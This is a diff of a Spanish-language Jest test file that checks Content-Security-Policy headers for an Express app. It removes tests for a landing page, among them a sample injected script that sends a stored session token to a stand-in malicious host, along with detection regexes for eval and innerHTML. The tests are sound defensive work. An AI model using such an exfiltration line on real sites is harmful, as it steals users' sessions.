@@ -1,59 +1,28 @@
-import { createHash } from 'node:crypto';
-import { readFileSync } from 'node:fs';
-import { join } from 'node:path';
 import { Request, Response } from 'express';
-import { calcularPoliticas, crearCabecerasDeSeguridad, hashCsp, politicaPara } from './cabeceras-de-seguridad';
+import { calcularPoliticas, crearCabecerasDeSeguridad, politicaPara } from './cabeceras-de-seguridad';
 import { rechazarCuerpoComprimido, saltosDeProxy } from './configurar-seguridad';
 import { origenPermitido } from './cors';
 import { esDeCloudflare, usarOrigenDeCloudflare } from './origen-del-cliente';
 
 describe('Seguridad HTTP (ADR-0029)', () => {
-  const vitrina = readFileSync(join(__dirname, '..', '..', 'public', 'index.html'), 'utf-8');
-
   describe('Política de contenido (CSP)', () => {
-    it('el hash coincide con el que calcula el navegador: sha256 en base64 del contenido, con saltos de línea normalizados', () => {
-      const esperado = `'sha256-${createHash('sha256').update('alert(1)\n').digest('base64')}'`;
-      expect(hashCsp('alert(1)\r\n')).toBe(esperado);
-      expect(hashCsp('alert(1)\n')).toBe(esperado);
-    });
-
-    it('la vitrina solo puede ejecutar su propio script y aplicar su propio estilo, y no cargar nada de fuera ni ser enmarcada', () => {
-      const { vitrina: csp } = calcularPoliticas('<style>a{}</style><script>let x = 1;</script>');
-      expect(csp).toContain(`script-src 'self' ${hashCsp('let x = 1;')}`);
-      expect(csp).toContain(`style-src 'self' ${hashCsp('a{}')}`);
-      expect(csp).toContain("default-src 'none'");
-      expect(csp).toContain("frame-ancestors 'none'");
-      expect(csp).not.toContain('unsafe-inline');
-      expect(csp).not.toContain('unsafe-eval');
-    });
-
-    it('un script inyectado (otro contenido, otro hash) no está permitido', () => {
-      const { vitrina: csp } = calcularPoliticas(vitrina);
-      expect(csp).not.toContain(hashCsp('fetch("https://sitio-malicioso.example/?t=" + localStorage.getItem("recobra.sesion"))'));
-    });
-
-    it('cada ruta recibe la política que le toca: vitrina, app web o API', () => {
-      const p = calcularPoliticas(vitrina);
-      expect(politicaPara('/', p)).toBe(p.vitrina);
-      expect(politicaPara('/index.html', p)).toBe(p.vitrina);
+    it('cada ruta recibe la política que le toca: app web o API (la raíz solo redirige, ADR-0031)', () => {
+      const p = calcularPoliticas();
+      expect(politicaPara('/', p)).toBe(p.api);
+      expect(politicaPara('/index.html', p)).toBe(p.api);
       expect(politicaPara('/app/', p)).toBe(p.app);
       expect(politicaPara('/app/main.dart.js', p)).toBe(p.app);
       expect(politicaPara('/publicaciones', p)).toBe(p.api);
       expect(politicaPara('/apple', p)).toBe(p.api); // empieza con "/app" pero no es /app/
-      expect(p.app).toContain("script-src 'self' 'wasm-unsafe-eval'");
-      expect(p.app).not.toMatch(/script-src[^;]*unsafe-inline/);
     });
-  });
 
-  describe('Guardia de la vitrina: lo que su política bloquearía no debe aparecer', () => {
-    it('un solo script y un solo estilo en línea, y ningún manejador, atributo style, javascript: ni eval', () => {
-      expect([...vitrina.matchAll(/<script\b[^>]*>/g)].map((m) => m[0])).toEqual(['<script>']);
-      expect([...vitrina.matchAll(/<style\b[^>]*>/g)].map((m) => m[0])).toEqual(['<style>']);
-      expect(vitrina).not.toMatch(/\son[a-z]+\s*=\s*["']/i); // onclick="…"
-      expect(vitrina).not.toMatch(/\sstyle\s*=\s*["']/i); // style="…": solo se permite por hash el bloque <style>
-      expect(vitrina).not.toMatch(/javascript:/i);
-      expect(vitrina).not.toMatch(/\beval\s*\(|new\s+Function\s*\(|document\.write\s*\(|setAttribute\(\s*['"]style['"]|\.cssText\b/);
-      expect(vitrina).not.toMatch(/\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML/); // todo se pinta con textContent
+    it('la app web solo ejecuta sus propios archivos: ningún script en línea ni de otro sitio, y no puede ser enmarcada', () => {
+      const { app } = calcularPoliticas();
+      expect(app).toContain("script-src 'self' 'wasm-unsafe-eval'");
+      expect(app).not.toMatch(/script-src[^;]*unsafe-inline/);
+      expect(app).not.toMatch(/script-src[^;]*\s'unsafe-eval'/);
+      expect(app).not.toMatch(/script-src[^;]*https?:/);
+      expect(app).toContain("frame-ancestors 'none'");
     });
   });
 
